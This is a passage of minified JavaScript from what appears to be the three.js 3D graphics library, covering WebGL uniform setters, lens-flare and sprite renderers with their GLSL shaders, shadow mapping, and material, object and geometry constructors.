0===b.x?a.uniform2fv(this.addr,b):a.uniform2f(this.addr,b.x,b.y)}function cf(a,b){void 0!==b.x?a.uniform3f(this.addr,\nb.x,b.y,b.z):void 0!==b.r?a.uniform3f(this.addr,b.r,b.g,b.b):a.uniform3fv(this.addr,b)}function df(a,b){void 0===b.x?a.uniform4fv(this.addr,b):a.uniform4f(this.addr,b.x,b.y,b.z,b.w)}function ef(a,b){a.uniformMatrix2fv(this.addr,!1,b.elements||b)}function ff(a,b){a.uniformMatrix3fv(this.addr,!1,b.elements||b)}function gf(a,b){a.uniformMatrix4fv(this.addr,!1,b.elements||b)}function hf(a,b,c){var d=c.allocTextureUnit();a.uniform1i(this.addr,d);c.setTexture2D(b||Ee,d)}function jf(a,b,c){var d=c.allocTextureUnit();\na.uniform1i(this.addr,d);c.setTextureCube(b||Fe,d)}function Ge(a,b){a.uniform2iv(this.addr,b)}function He(a,b){a.uniform3iv(this.addr,b)}function Ie(a,b){a.uniform4iv(this.addr,b)}function kf(a){switch(a){case 5126:return $e;case 35664:return bf;case 35665:return cf;case 35666:return df;case 35674:return ef;case 35675:return ff;case 35676:return gf;case 35678:return hf;case 35680:return jf;case 5124:case 35670:return af;case 35667:case 35671:return Ge;case 35668:case 35672:return He;case 35669:case 35673:return Ie}}\nfunction lf(a,b){a.uniform1fv(this.addr,b)}function mf(a,b){a.uniform1iv(this.addr,b)}function nf(a,b){a.uniform2fv(this.addr,Hb(b,this.size,2))}function of(a,b){a.uniform3fv(this.addr,Hb(b,this.size,3))}function pf(a,b){a.uniform4fv(this.addr,Hb(b,this.size,4))}function qf(a,b){a.uniformMatrix2fv(this.addr,!1,Hb(b,this.size,4))}function rf(a,b){a.uniformMatrix3fv(this.addr,!1,Hb(b,this.size,9))}function sf(a,b){a.uniformMatrix4fv(this.addr,!1,Hb(b,this.size,16))}function tf(a,b,c){var d=b.length,\ne=Ce(c,d);a.uniform1iv(this.addr,e);for(a=0;a!==d;++a)c.setTexture2D(b[a]||Ee,e[a])}function uf(a,b,c){var d=b.length,e=Ce(c,d);a.uniform1iv(this.addr,e);for(a=0;a!==d;++a)c.setTextureCube(b[a]||Fe,e[a])}function vf(a){switch(a){case 5126:return lf;case 35664:return nf;case 35665:return of;case 35666:return pf;case 35674:return qf;case 35675:return rf;case 35676:return sf;case 35678:return tf;case 35680:return uf;case 5124:case 35670:return mf;case 35667:case 35671:return Ge;case 35668:case 35672:return He;\ncase 35669:case 35673:return Ie}}function wf(a,b,c){this.id=a;this.addr=c;this.setValue=kf(b.type)}function xf(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=vf(b.type)}function Je(a){this.id=a;this.seq=[];this.map={}}function $a(a,b,c){this.seq=[];this.map={};this.renderer=c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var d=0;d<c;++d){var e=a.getActiveUniform(b,d),f=a.getUniformLocation(b,e.name),g=this,h=e.name,m=h.length;for(Rd.lastIndex=0;;){var k=Rd.exec(h),t=Rd.lastIndex,p=\nk[1],n=k[3];\"]\"===k[2]&&(p|=0);if(void 0===n||\"[\"===n&&t+2===m){h=g;e=void 0===n?new wf(p,e,f):new xf(p,e,f);h.seq.push(e);h.map[e.id]=e;break}else n=g.map[p],void 0===n&&(n=new Je(p),p=g,g=n,p.seq.push(g),p.map[g.id]=g),g=n}}}function J(a,b,c){return void 0===b&&void 0===c?this.set(a):this.setRGB(a,b,c)}function eb(a,b,c,d,e,f,g,h,m,k,t,p){ea.call(this,null,f,g,h,m,k,d,e,t,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==m?m:1003;this.minFilter=void 0!==k?k:1003;this.flipY=this.generateMipmaps=\n!1;this.unpackAlignment=1}function sc(a,b){this.min=void 0!==a?a:new D(Infinity,Infinity);this.max=void 0!==b?b:new D(-Infinity,-Infinity)}function yf(a,b){var c,d,e,f,g,h,m,k,t,p,n=a.context,u=a.state,l,r,A,w,y,K;this.render=function(v,E,L){if(0!==b.length){v=new q;var C=L.w/L.z,F=.5*L.z,da=.5*L.w,H=16/L.w,aa=new D(H*C,H),Da=new q(1,1,0),fb=new D(1,1),Sd=new sc;Sd.min.set(L.x,L.y);Sd.max.set(L.x+(L.z-16),L.y+(L.w-16));if(void 0===w){var H=new Float32Array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),Q=\nnew Uint16Array([0,1,2,0,2,3]);l=n.createBuffer();r=n.createBuffer();n.bindBuffer(n.ARRAY_BUFFER,l);n.bufferData(n.ARRAY_BUFFER,H,n.STATIC_DRAW);n.bindBuffer(n.ELEMENT_ARRAY_BUFFER,r);n.bufferData(n.ELEMENT_ARRAY_BUFFER,Q,n.STATIC_DRAW);y=n.createTexture();K=n.createTexture();u.bindTexture(n.TEXTURE_2D,y);n.texImage2D(n.TEXTURE_2D,0,n.RGB,16,16,0,n.RGB,n.UNSIGNED_BYTE,null);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_S,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_T,n.CLAMP_TO_EDGE);\nn.texParameteri(n.TEXTURE_2D,n.TEXTURE_MAG_FILTER,n.NEAREST);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MIN_FILTER,n.NEAREST);u.bindTexture(n.TEXTURE_2D,K);n.texImage2D(n.TEXTURE_2D,0,n.RGBA,16,16,0,n.RGBA,n.UNSIGNED_BYTE,null);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_S,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_T,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MAG_FILTER,n.NEAREST);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MIN_FILTER,n.NEAREST);var H=A={vertexShader:\"uniform lowp int renderType;\\nuniform vec3 screenPosition;\\nuniform vec2 scale;\\nuniform float rotation;\\nuniform sampler2D occlusionMap;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nvUV = uv;\\nvec2 pos = position;\\nif ( renderType == 2 ) {\\nvec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );\\nvVisibility =        visibility.r / 9.0;\\nvVisibility *= 1.0 - visibility.g / 9.0;\\nvVisibility *=       visibility.b / 9.0;\\nvVisibility *= 1.0 - visibility.a / 9.0;\\npos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;\\npos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;\\n}\\ngl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );\\n}\",\nfragmentShader:\"uniform lowp int renderType;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform vec3 color;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nif ( renderType == 0 ) {\\ngl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );\\n} else if ( renderType == 1 ) {\\ngl_FragColor = texture2D( map, vUV );\\n} else {\\nvec4 texture = texture2D( map, vUV );\\ntexture.a *= opacity * vVisibility;\\ngl_FragColor = texture;\\ngl_FragColor.rgb *= color;\\n}\\n}\"},Q=n.createProgram(),M=n.createShader(n.FRAGMENT_SHADER),\nO=n.createShader(n.VERTEX_SHADER),P=\"precision \"+a.getPrecision()+\" float;\\n\";n.shaderSource(M,P+H.fragmentShader);n.shaderSource(O,P+H.vertexShader);n.compileShader(M);n.compileShader(O);n.attachShader(Q,M);n.attachShader(Q,O);n.linkProgram(Q);w=Q;t=n.getAttribLocation(w,\"position\");p=n.getAttribLocation(w,\"uv\");c=n.getUniformLocation(w,\"renderType\");d=n.getUniformLocation(w,\"map\");e=n.getUniformLocation(w,\"occlusionMap\");f=n.getUniformLocation(w,\"opacity\");g=n.getUniformLocation(w,\"color\");h=n.getUniformLocation(w,\n\"scale\");m=n.getUniformLocation(w,\"rotation\");k=n.getUniformLocation(w,\"screenPosition\")}n.useProgram(w);u.initAttributes();u.enableAttribute(t);u.enableAttribute(p);u.disableUnusedAttributes();n.uniform1i(e,0);n.uniform1i(d,1);n.bindBuffer(n.ARRAY_BUFFER,l);n.vertexAttribPointer(t,2,n.FLOAT,!1,16,0);n.vertexAttribPointer(p,2,n.FLOAT,!1,16,8);n.bindBuffer(n.ELEMENT_ARRAY_BUFFER,r);u.disable(n.CULL_FACE);u.setDepthWrite(!1);Q=0;for(M=b.length;Q<M;Q++)if(H=16/L.w,aa.set(H*C,H),O=b[Q],v.set(O.matrixWorld.elements[12],\nO.matrixWorld.elements[13],O.matrixWorld.elements[14]),v.applyMatrix4(E.matrixWorldInverse),v.applyMatrix4(E.projectionMatrix),Da.copy(v),fb.x=L.x+Da.x*F+F-8,fb.y=L.y+Da.y*da+da-8,!0===Sd.containsPoint(fb)){u.activeTexture(n.TEXTURE0);u.bindTexture(n.TEXTURE_2D,null);u.activeTexture(n.TEXTURE1);u.bindTexture(n.TEXTURE_2D,y);n.copyTexImage2D(n.TEXTURE_2D,0,n.RGB,fb.x,fb.y,16,16,0);n.uniform1i(c,0);n.uniform2f(h,aa.x,aa.y);n.uniform3f(k,Da.x,Da.y,Da.z);u.disable(n.BLEND);u.enable(n.DEPTH_TEST);n.drawElements(n.TRIANGLES,\n6,n.UNSIGNED_SHORT,0);u.activeTexture(n.TEXTURE0);u.bindTexture(n.TEXTURE_2D,K);n.copyTexImage2D(n.TEXTURE_2D,0,n.RGBA,fb.x,fb.y,16,16,0);n.uniform1i(c,1);u.disable(n.DEPTH_TEST);u.activeTexture(n.TEXTURE1);u.bindTexture(n.TEXTURE_2D,y);n.drawElements(n.TRIANGLES,6,n.UNSIGNED_SHORT,0);O.positionScreen.copy(Da);O.customUpdateCallback?O.customUpdateCallback(O):O.updateLensFlares();n.uniform1i(c,2);u.enable(n.BLEND);for(var P=0,wa=O.lensFlares.length;P<wa;P++){var W=O.lensFlares[P];.001<W.opacity&&.001<\nW.scale&&(Da.x=W.x,Da.y=W.y,Da.z=W.z,H=W.size*W.scale/L.w,aa.x=H*C,aa.y=H,n.uniform3f(k,Da.x,Da.y,Da.z),n.uniform2f(h,aa.x,aa.y),n.uniform1f(m,W.rotation),n.uniform1f(f,W.opacity),n.uniform3f(g,W.color.r,W.color.g,W.color.b),u.setBlending(W.blending,W.blendEquation,W.blendSrc,W.blendDst),a.setTexture2D(W.texture,1),n.drawElements(n.TRIANGLES,6,n.UNSIGNED_SHORT,0))}}u.enable(n.CULL_FACE);u.enable(n.DEPTH_TEST);u.setDepthWrite(!0);a.resetGLState()}}}function zf(a,b){var c,d,e,f,g,h,m,k,t,p,n,u,l,r,\nA,w,y;function K(a,b){return a.renderOrder!==b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var v=a.context,E=a.state,L,C,F,da,H=new q,aa=new ca,Da=new q;this.render=function(q,D){if(0!==b.length){if(void 0===F){var Q=new Float32Array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),M=new Uint16Array([0,1,2,0,2,3]);L=v.createBuffer();C=v.createBuffer();v.bindBuffer(v.ARRAY_BUFFER,L);v.bufferData(v.ARRAY_BUFFER,Q,v.STATIC_DRAW);v.bindBuffer(v.ELEMENT_ARRAY_BUFFER,C);v.bufferData(v.ELEMENT_ARRAY_BUFFER,\nM,v.STATIC_DRAW);var Q=v.createProgram(),M=v.createShader(v.VERTEX_SHADER),O=v.createShader(v.FRAGMENT_SHADER);v.shaderSource(M,[\"precision \"+a.getPrecision()+\" float;\",\"uniform mat4 modelViewMatrix;\\nuniform mat4 projectionMatrix;\\nuniform float rotation;\\nuniform vec2 scale;\\nuniform vec2 uvOffset;\\nuniform vec2 uvScale;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvoid main() {\\nvUV = uvOffset + uv * uvScale;\\nvec2 alignedPosition = position * scale;\\nvec2 rotatedPosition;\\nrotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\\nrotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\\nvec4 finalPosition;\\nfinalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\\nfinalPosition.xy += rotatedPosition;\\nfinalPosition = projectionMatrix * finalPosition;\\ngl_Position = finalPosition;\\n}\"].join(\"\\n\"));\nv.shaderSource(O,[\"precision \"+a.getPrecision()+\" float;\",\"uniform vec3 color;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform int fogType;\\nuniform vec3 fogColor;\\nuniform float fogDensity;\\nuniform float fogNear;\\nuniform float fogFar;\\nuniform float alphaTest;\\nvarying vec2 vUV;\\nvoid main() {\\nvec4 texture = texture2D( map, vUV );\\nif ( texture.a < alphaTest ) discard;\\ngl_FragColor = vec4( color * texture.xyz, texture.a * opacity );\\nif ( fogType > 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nv.compileShader(M);v.compileShader(O);v.attachShader(Q,M);v.attachShader(Q,O);v.linkProgram(Q);F=Q;w=v.getAttribLocation(F,\"position\");y=v.getAttribLocation(F,\"uv\");c=v.getUniformLocation(F,\"uvOffset\");d=v.getUniformLocation(F,\"uvScale\");e=v.getUniformLocation(F,\"rotation\");f=v.getUniformLocation(F,\"scale\");g=v.getUniformLocation(F,\"color\");h=v.getUniformLocation(F,\"map\");m=v.getUniformLocation(F,\"opacity\");k=v.getUniformLocation(F,\"modelViewMatrix\");t=v.getUniformLocation(F,\"projectionMatrix\");p=\nv.getUniformLocation(F,\"fogType\");n=v.getUniformLocation(F,\"fogDensity\");u=v.getUniformLocation(F,\"fogNear\");l=v.getUniformLocation(F,\"fogFar\");r=v.getUniformLocation(F,\"fogColor\");A=v.getUniformLocation(F,\"alphaTest\");Q=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");Q.width=8;Q.height=8;M=Q.getContext(\"2d\");M.fillStyle=\"white\";M.fillRect(0,0,8,8);da=new ea(Q);da.needsUpdate=!0}v.useProgram(F);E.initAttributes();E.enableAttribute(w);E.enableAttribute(y);E.disableUnusedAttributes();\nE.disable(v.CULL_FACE);E.enable(v.BLEND);v.bindBuffer(v.ARRAY_BUFFER,L);v.vertexAttribPointer(w,2,v.FLOAT,!1,16,0);v.vertexAttribPointer(y,2,v.FLOAT,!1,16,8);v.bindBuffer(v.ELEMENT_ARRAY_BUFFER,C);v.uniformMatrix4fv(t,!1,D.projectionMatrix.elements);E.activeTexture(v.TEXTURE0);v.uniform1i(h,0);M=Q=0;(O=q.fog)?(v.uniform3f(r,O.color.r,O.color.g,O.color.b),O.isFog?(v.uniform1f(u,O.near),v.uniform1f(l,O.far),v.uniform1i(p,1),M=Q=1):O.isFogExp2&&(v.uniform1f(n,O.density),v.uniform1i(p,2),M=Q=2)):(v.uniform1i(p,\n0),M=Q=0);for(var O=0,P=b.length;O<P;O++){var wa=b[O];wa.modelViewMatrix.multiplyMatrices(D.matrixWorldInverse,wa.matrixWorld);wa.z=-wa.modelViewMatrix.elements[14]}b.sort(K);for(var W=[],O=0,P=b.length;O<P;O++){var wa=b[O],x=wa.material;!1!==x.visible&&(v.uniform1f(A,x.alphaTest),v.uniformMatrix4fv(k,!1,wa.modelViewMatrix.elements),wa.matrixWorld.decompose(H,aa,Da),W[0]=Da.x,W[1]=Da.y,wa=0,q.fog&&x.fog&&(wa=M),Q!==wa&&(v.uniform1i(p,wa),Q=wa),null!==x.map?(v.uniform2f(c,x.map.offset.x,x.map.offset.y),\nv.uniform2f(d,x.map.repeat.x,x.map.repeat.y)):(v.uniform2f(c,0,0),v.uniform2f(d,1,1)),v.uniform1f(m,x.opacity),v.uniform3f(g,x.color.r,x.color.g,x.color.b),v.uniform1f(e,x.rotation),v.uniform2fv(f,W),E.setBlending(x.blending,x.blendEquation,x.blendSrc,x.blendDst),E.setDepthTest(x.depthTest),E.setDepthWrite(x.depthWrite),x.map?a.setTexture2D(x.map,0):a.setTexture2D(da,0),v.drawElements(v.TRIANGLES,6,v.UNSIGNED_SHORT,0))}E.enable(v.CULL_FACE);a.resetGLState()}}}function X(){Object.defineProperty(this,\n\"id\",{value:Af++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=1;this.side=0;this.shading=2;this.vertexColors=0;this.opacity=1;this.transparent=!1;this.blendSrc=204;this.blendDst=205;this.blendEquation=100;this.blendEquationAlpha=this.blendDstAlpha=this.blendSrcAlpha=null;this.depthFunc=3;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=this.clipIntersection=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=\n!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0}function Ha(a){X.call(this);this.type=\"ShaderMaterial\";this.defines={};this.uniforms={};this.vertexShader=\"void main() {\\n\\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\\n}\";this.fragmentShader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\";this.linewidth=1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=\nthis.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1};this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void 0;void 0!==a&&(void 0!==a.attributes&&console.error(\"THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead.\"),this.setValues(a))}function ab(a){X.call(this);this.type=\"MeshDepthMaterial\";this.depthPacking=3200;this.morphTargets=\nthis.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)}function Pa(a,b){this.min=void 0!==a?a:new q(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new q(-Infinity,-Infinity,-Infinity)}function Na(a,b){this.center=void 0!==a?a:new q;this.radius=void 0!==b?b:0}function ya(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.\")}\nfunction la(a,b){this.normal=void 0!==a?a:new q(1,0,0);this.constant=void 0!==b?b:0}function tc(a,b,c,d,e,f){this.planes=[void 0!==a?a:new la,void 0!==b?b:new la,void 0!==c?c:new la,void 0!==d?d:new la,void 0!==e?e:new la,void 0!==f?f:new la]}function Ke(a,b,c,d){function e(b,c,d,e){var f=b.geometry,g;g=A;var h=b.customDepthMaterial;d&&(g=w,h=b.customDistanceMaterial);h?g=h:(h=!1,c.morphTargets&&(f&&f.isBufferGeometry?h=f.morphAttributes&&f.morphAttributes.position&&0<f.morphAttributes.position.length:\nf&&f.isGeometry&&(h=f.morphTargets&&0<f.morphTargets.length)),b=b.isSkinnedMesh&&c.skinning,f=0,h&&(f|=1),b&&(f|=2),g=g[f]);a.localClippingEnabled&&!0===c.clipShadows&&0!==c.clippingPlanes.length&&(f=g.uuid,h=c.uuid,b=y[f],void 0===b&&(b={},y[f]=b),f=b[h],void 0===f&&(f=g.clone(),b[h]=f),g=f);g.visible=c.visible;g.wireframe=c.wireframe;h=c.side;aa.renderSingleSided&&2==h&&(h=0);aa.renderReverseSided&&(0===h?h=1:1===h&&(h=0));g.side=h;g.clipShadows=c.clipShadows;g.clippingPlanes=c.clippingPlanes;g.wireframeLinewidth=\nc.wireframeLinewidth;g.linewidth=c.linewidth;d&&void 0!==g.uniforms.lightPos&&g.uniforms.lightPos.value.copy(e);return g}function f(a,b,c){if(!1!==a.visible){0!==(a.layers.mask&b.layers.mask)&&(a.isMesh||a.isLine||a.isPoints)&&a.castShadow&&(!1===a.frustumCulled||!0===m.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),r.push(a));a=a.children;for(var d=0,e=a.length;d<e;d++)f(a[d],b,c)}}var g=a.context,h=a.state,m=new tc,k=new S,\nt=b.shadows,p=new D,n=new D(d.maxTextureSize,d.maxTextureSize),u=new q,l=new q,r=[],A=Array(4),w=Array(4),y={},K=[new q(1,0,0),new q(-1,0,0),new q(0,0,1),new q(0,0,-1),new q(0,1,0),new q(0,-1,0)],v=[new q(0,1,0),new q(0,1,0),new q(0,1,0),new q(0,1,0),new q(0,0,1),new q(0,0,-1)],E=[new fa,new fa,new fa,new fa,new fa,new fa];b=new ab;b.depthPacking=3201;b.clipping=!0;d=bb.distanceRGBA;for(var L=Ja.clone(d.uniforms),C=0;4!==C;++C){var F=0!==(C&1),da=0!==(C&2),H=b.clone();H.morphTargets=F;H.skinning=\nda;A[C]=H;F=new Ha({defines:{USE_SHADOWMAP:\"\"},uniforms:L,vertexShader:d.vertexShader,fragmentShader:d.fragmentShader,morphTargets:F,skinning:da,clipping:!0});w[C]=F}var aa=this;this.enabled=!1;this.autoUpdate=!0;this.needsUpdate=!1;this.type=1;this.renderSingleSided=this.renderReverseSided=!0;this.render=function(b,d){if(!1!==aa.enabled&&(!1!==aa.autoUpdate||!1!==aa.needsUpdate)&&0!==t.length){h.buffers.color.setClear(1,1,1,1);h.disable(g.BLEND);h.setDepthTest(!0);h.setScissorTest(!1);for(var y,\nq,A=0,C=t.length;A<C;A++){var w=t[A],L=w.shadow;if(void 0===L)console.warn(\"THREE.WebGLShadowMap:\",w,\"has no shadow.\");else{var F=L.camera;p.copy(L.mapSize);p.min(n);if(w&&w.isPointLight){y=6;q=!0;var H=p.x,da=p.y;E[0].set(2*H,da,H,da);E[1].set(0,da,H,da);E[2].set(3*H,da,H,da);E[3].set(H,da,H,da);E[4].set(3*H,0,H,da);E[5].set(H,0,H,da);p.x*=4;p.y*=2}else y=1,q=!1;null===L.map&&(L.map=new Ya(p.x,p.y,{minFilter:1003,magFilter:1003,format:1023}),F.updateProjectionMatrix());L.isSpotLightShadow&&L.update(w);\nL&&L.isRectAreaLightShadow&&L.update(w);H=L.map;L=L.matrix;l.setFromMatrixPosition(w.matrixWorld);F.position.copy(l);a.setRenderTarget(H);a.clear();for(H=0;H<y;H++){q?(u.copy(F.position),u.add(K[H]),F.up.copy(v[H]),F.lookAt(u),h.viewport(E[H])):(u.setFromMatrixPosition(w.target.matrixWorld),F.lookAt(u));F.updateMatrixWorld();F.matrixWorldInverse.getInverse(F.matrixWorld);L.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1);L.multiply(F.projectionMatrix);L.multiply(F.matrixWorldInverse);k.multiplyMatrices(F.projectionMatrix,\nF.matrixWorldInverse);m.setFromMatrix(k);r.length=0;f(b,d,F);for(var da=0,x=r.length;da<x;da++){var D=r[da],Td=c.update(D),Sa=D.material;if(Sa&&Sa.isMultiMaterial)for(var Le=Td.groups,Sa=Sa.materials,z=0,Ea=Le.length;z<Ea;z++){var I=Le[z],J=Sa[I.materialIndex];!0===J.visible&&(J=e(D,J,q,l),a.renderBufferDirect(F,null,Td,J,D,I))}else J=e(D,Sa,q,l),a.renderBufferDirect(F,null,Td,J,D,null)}}}}y=a.getClearColor();q=a.getClearAlpha();a.setClearColor(y,q);aa.needsUpdate=!1}}}function cb(a,b){this.origin=\nvoid 0!==a?a:new q;this.direction=void 0!==b?b:new q}function db(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||db.DefaultOrder}function nd(){this.mask=1}function x(){Object.defineProperty(this,\"id\",{value:Bf++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=x.DefaultUp.clone();var a=new q,b=new db,c=new ca,d=new q(1,1,1);b.onChange(function(){c.setFromEuler(b,!1)});c.onChange(function(){b.setFromQuaternion(c,void 0,!1)});Object.defineProperties(this,\n{position:{enumerable:!0,value:a},rotation:{enumerable:!0,value:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelViewMatrix:{value:new S},normalMatrix:{value:new ya}});this.matrix=new S;this.matrixWorld=new S;this.matrixAutoUpdate=x.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new nd;this.visible=!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={};this.onBeforeRender=function(){};this.onAfterRender=function(){}}\nfunction hb(a,b){this.start=void 0!==a?a:new q;this.end=void 0!==b?b:new q}function za(a,b,c){this.a=void 0!==a?a:new q;this.b=void 0!==b?b:new q;this.c=void 0!==c?c:new q}function ha(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d&&d.isVector3?d:new q;this.vertexNormals=Array.isArray(d)?d:[];this.color=e&&e.isColor?e:new J;this.vertexColors=Array.isArray(e)?e:[];this.materialIndex=void 0!==f?f:0}function Ka(a){X.call(this);this.type=\"MeshBasicMaterial\";this.color=new J(16777215);this.lightMap=\nthis.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.lights=this.morphTargets=this.skinning=!1;this.setValues(a)}function U(a,b,c){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");this.uuid=N.generateUUID();this.array=a;\nthis.itemSize=b;this.count=void 0!==a?a.length/b:0;this.normalized=!0===c;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.onUploadCallback=function(){};this.version=0}function uc(a,b){U.call(this,new Int8Array(a),b)}function vc(a,b){U.call(this,new Uint8Array(a),b)}function wc(a,b){U.call(this,new Uint8ClampedArray(a),b)}function xc(a,b){U.call(this,new Int16Array(a),b)}function ib(a,b){U.call(this,new Uint16Array(a),b)}function yc(a,b){U.call(this,new Int32Array(a),b)}function jb(a,b){U.call(this,\nnew Uint32Array(a),b)}function z(a,b){U.call(this,new Float32Array(a),b)}function zc(a,b){U.call(this,new Float64Array(a),b)}function Me(){this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1}function Ud(a){for(var b=a.length,c=-Infinity;b--;)a[b]>\nc&&(c=a[b]);return c}function T(){Object.defineProperty(this,\"id\",{value:Vd++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.verticesNeedUpdate=this.elementsNeedUpdate=\n!1}function I(){Object.defineProperty(this,\"id\",{value:Vd++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"BufferGeometry\";this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.drawRange={start:0,count:Infinity}}function Aa(a,b){x.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new Ka({color:16777215*Math.random()});this.drawMode=0;this.updateMorphTargets()}function Ib(a,b,c,d,e,f){T.call(this);\nthis.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new kb(a,b,c,d,e,f));this.mergeVertices()}function kb(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,l,L,C,F){var da=f/L,H=g/C,aa=f/2,x=g/2,D=l/2;g=L+1;var z=C+1,Q=f=0,M,O,P=new q;for(O=0;O<z;O++){var 